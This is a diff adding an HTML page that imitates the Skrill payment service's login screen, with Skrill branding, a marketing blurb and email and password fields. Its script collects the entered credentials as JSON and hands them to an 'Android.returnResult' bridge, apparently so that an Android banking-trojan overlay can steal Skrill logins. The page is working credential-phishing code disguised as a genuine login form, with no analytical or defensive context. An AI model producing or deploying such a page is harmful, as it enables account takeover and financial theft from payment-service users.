@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Log in</title>
+    <link rel="shortcut icon" href="com.moneybookers.skrillpayments.png" type="image/png">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #fff;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+    text-align: right;
+    background-size: 100%;
+    padding: 20px 30px 20px 0px;
+    background: none;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 10px 0px;
+    color: #7e7e7e;
+    text-align: left;
+    background: rgb(246, 246, 246);;
+    outline: none;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+    border-bottom: 1.5px solid #b8b8b8;
+    border-radius: 5px 5px 0px 0px;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    background: #714cb4;
+    color: #ffffff;
+    border: 1px solid #714cb4;
+    font-size: 14px;
+    -webkit-appearance: none;
+    border-radius: 10px;
+    cursor: pointer;
+}
+fieldset span {
+    display: inline-block;
+    text-align: center;
+    color: #111111;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #7e7e7e;
+    font-size: 15px;
+}
+</style>
+
+<script type="text/javascript">
+    function openLogin() {
+        document.getElementById("home").style.display="none";
+        document.getElementById("log").style.display="block";
+    }
+</script>
+
+<fieldset id="formtosend">
+
+<div class="" id="home" style="display: block;">
+    <div class="logo1" style="text-align: center; margin: 100px 0px 0px 0px;">
+        <h3 style="font-weight: 400; font-size: 25px;">Send money. Get money.</h3>
+        <span>With Skrill, money transfers reach any place on Earth. Send to a bank account, mobile wallet, or just an email address.</span>
+    </div>
+    <div class="bottom" style="padding: 0px 30px 0px 30px;">
+        <input type="button" name="sumbit" value="REGISTER" style="background: #9d1a6f; border: 1px solid #9d1a6f; width: 47%;">
+    <input type="button" name="sumbit" onclick="openLogin()" value="LOG IN" style="background: none; color: #714cb4; width: 47%; float: left;">
+</div>
+</div>
+
+<div class="" id="log" style="display: none;">
+
+<div class="logo1" style="text-align: center; margin: 50px 0px 0px 0px;">
+<img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMjI3cHgiIGhlaWdodD0iNzhweCIgdmlld0JveD0iMCAwIDIyNyA3OCIgdmVyc2lvbj0iMS4xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KICAgIDwhLS0gR2VuZXJhdG9yOiBTa2V0Y2ggNDMuMiAoMzkwNjkpIC0gaHR0cDovL3d3dy5ib2hlbWlhbmNvZGluZy5jb20vc2tldGNoIC0tPgogICAgPHRpdGxlPnNrcmlsbC1sb2dvLXdoaXRlPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBTa2V0Y2guPC9kZXNjPgogICAgPGRlZnM+CiAgICAgICAgPGxpbmVhckdyYWRpZW50IHgxPSIyNy4wNDM5NTgyJSIgeTE9IjAlIiB4Mj0iNzkuMjYyOTEzMyUiIHkyPSIxMDAlIiBpZD0ibGluZWFyR3JhZGllbnQtMSI+CiAgICAgICAgICAgIDxzdG9wIHN0b3AtY29sb3I9IiM2QjE5NUYiIG9mZnNldD0iMCUiPjwvc3RvcD4KICAgICAgICAgICAgPHN0b3Agc3RvcC1jb2xvcj0iIzRDMjU1QiIgb2Zmc2V0PSIxMDAlIj48L3N0b3A+CiAgICAgICAgPC9saW5lYXJHcmFkaWVudD4KICAgIDwvZGVmcz4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJza3JpbGwtbG9nby13ZWItMS1yZ2IiIGZpbGw9InVybCgjbGluZWFyR3JhZGllbnQtMSkiPgogICAgICAgICAgICA8cGF0aCBkPSJNMTYyLjg5MSwxOS4xNTMgQzE2OC4wMzIsMTkuMTUzIDE3Mi4xOTksMTQuOTg4IDE3Mi4xOTksOS44NTIgQzE3Mi4xOTksNC43MTMgMTY4LjAzMiwwLjU0NCAxNjIuODkxLDAuNTQ0IEMxNTcuNzU2LDAuNTQ0IDE1My41OTEsNC43MTMgMTUzLjU5MSw5Ljg1MiBDMTUzLjU5MSwxNC45ODggMTU3Ljc1NiwxOS4xNTMgMTYyLjg5MSwxOS4xNTMgTDE2Mi44OTEsMTkuMTUzIFogTTkxLjYwNCwyNC4xNzYgQzkxLjE4NCwyNS4yMzEgODguMTYxLDMzLjc3IDgwLjg1LDQyLjYyIEw4MC44NSw0Ljc3OSBMNjEuMzcsOC42MjkgTDYxLjM3LDc3LjIyIEw4MC44NSw3Ny4yMiBMODAuODUsNTYuMDE4IEM4Ni40OTIsNjQuNDggODkuMjc4LDc3LjIyIDg5LjI3OCw3Ny4yMiBMMTEyLjYxMSw3Ny4yMiBDMTEwLjMwMyw2Ny42MjUgMTAwLjIwNyw0OS45MzMgMTAwLjIwNyw0OS45MzMgQzEwOS4yNjgsMzguNDQ1IDExMy4yNDgsMjYuMjA0IDExMy44ODEsMjQuMTc2IEw5MS42MDQsMjQuMTc2IEw5MS42MDQsMjQuMTc2IFogTTE0Mi44MTYsMjMuNDYgQzEyNS4zNjgsMjQuMDIgMTE2LjUxMSwzMS44NDggMTE2LjUxMSw0Ny40MDkgTDExNi41MTEsNzcuMjIgTDEzNS41NDYsNzcuMjIgTDEzNS41NDYsNTIuOTEgQzEzNS41NDYsNDMuNTkyIDEzNi43NjYsMzkuNTk4IDE0Ny44MjMsMzkuMjE3IEwxNDcuODIzLDIzLjczMyBDMTQ1Ljk2MiwyMy4zMzggMTQyLjgxNiwyMy40NiAxNDIuODE2LDIzLjQ2IEwxNDIuODE2LDIzLjQ2IFogTTI4LjcsMzEuNzI5IEMyNi4zMTQsMzEuNTcyIDIwLjc5LDMxLjIxNSAyMC43OSwyNi4yNDIgQzIwLjc5LDIwLjI0MSAyOC43NDMsMjAuMjQxIDMxLjcyNiwyMC4yNDEgQzM2Ljk3MSwyMC4yNDEgNDMuNzY0LDIxLjc5MSA0OC42MTUsMjMuMjQyIEM0OC42MTUsMjMuMjQyIDUxLjMyMSwyNC4xOTYgNTMuNjI0LDI1LjE3MyBMNTMuODM4LDI1LjIzMSBMNTMuODM4LDguNzk2IEw1My41NDQsOC43MDkgQzQ3LjgxOSw2LjcwNiA0MS4xNjIsNC43NzkgMjguODIsNC43NzkgQzcuNTQsNC43NzkgMCwxNy4xNzYgMCwyNy43OTYgQzAsMzMuOTE4IDIuNjI0LDQ4LjMyNiAyNi45OTUsNDkuOTg4IEMyOS4wNjEsNTAuMTE1IDM0LjU0NCw1MC40MzEgMzQuNTQ0LDU1LjU3IEMzNC41NDQsNTkuODEzIDMwLjA1NSw2Mi4zMTUgMjIuNTA1LDYyLjMxNSBDMTQuMjMxLDYyLjMxNSA2LjIwNSw2MC4yMDUgMS4zMyw1OC4yMDQgTDEuMzMsNzUuMTMxIEM4LjYyOCw3Ny4wNDQgMTYuODU1LDc4IDI2LjQ5Nyw3OCBDNDcuMzA0LDc4IDU2LjYyMyw2Ni4yNzEgNTYuNjIzLDU0LjY0NiBDNTYuNjIzLDQxLjQ2NSA0Ni4xOTUsMzIuOTAxIDI4LjcsMzEuNzI5IEwyOC43LDMxLjcyOSBaIE0xNTMuNDU1LDc3LjIyIEwxNzIuMzM2LDc3LjIyIEwxNzIuMzM2LDI0LjIzNiBMMTUzLjQ1NSwyNC4yMzYgTDE1My40NTUsNzcuMjIgWiBNMjA3Ljg4OCw4LjE1NyBMMjA3Ljg4OCw3Ny4yMiBMMjI2Ljc3Miw3Ny4yMiBMMjI2Ljc3Miw0Ljc3OSBMMjA3Ljg4OCw4LjE1NyBMMjA3Ljg4OCw4LjE1NyBaIE0xODAuMzM0LDguMTU3IEwxOTkuMiw0Ljc3OSBMMTk5LjIsNzcuMjIgTDE4MC4zMzQsNzcuMjIgTDE4MC4zMzQsOC4xNTcgTDE4MC4zMzQsOC4xNTcgWiIgaWQ9IkZpbGwtMSI+PC9wYXRoPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc+" style="width: 90px;">
+</div>
+
+<div class="area" style="background: #fff; padding: 30px; border-radius: 3px; height: 320px;">
+        <input type="text" name="email" id="email" placeholder="Email" style="height: 50px;">
+        <input type="password" name="password" id="password" placeholder="Password" style="height: 50px;">
+        <button type="button" id="eye" style="background: none; border: none; float: right; position: relative; top: -53px; cursor: pointer;">
+        <img src="data:image/png;base64,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" alt="eye" />
+        </button>
+        <input name="exit" type="hidden" text="true"/>
+        <input type="button" name="sumbit" onclick="send_form()" value="LOG IN">
+        <a href="#" style="font-weight: 600;color: #942ea5;position: relative;text-decoration: none;font-size: 13px;display: inline-block;margin-top: 145px;margin-left: 50px;">RESET PASSWORD</a>
+
+</div>
+
+<div class="bottom" style="padding: 0px 30px 0px 30px;">
+    <span>Don't have an account?</span>
+    <input type="button" name="sumbit" value="REGISTER" style="background: none; color: #714cb4;">
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    if (document.getElementById("email").value == '')
+{
+    alert ('All fields required!');
+    return false;
+}
+if (document.getElementById("password").value == '')
+{
+    alert ('All fields required!');
+    return false;
+}
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+function show() {
+    var p = document.getElementById('password');
+    p.setAttribute('type', 'text');
+}
+
+function hide() {
+    var p = document.getElementById('password');
+    p.setAttribute('type', 'password');
+}
+
+var pwShown = 0;
+
+document.getElementById("eye").addEventListener("click", function () {
+    if (pwShown == 0) {
+        pwShown = 1;
+        show();
+    } else {
+        pwShown = 0;
+        hide();
+    }
+}, false);
+</script>
+
+</body>
+</html>
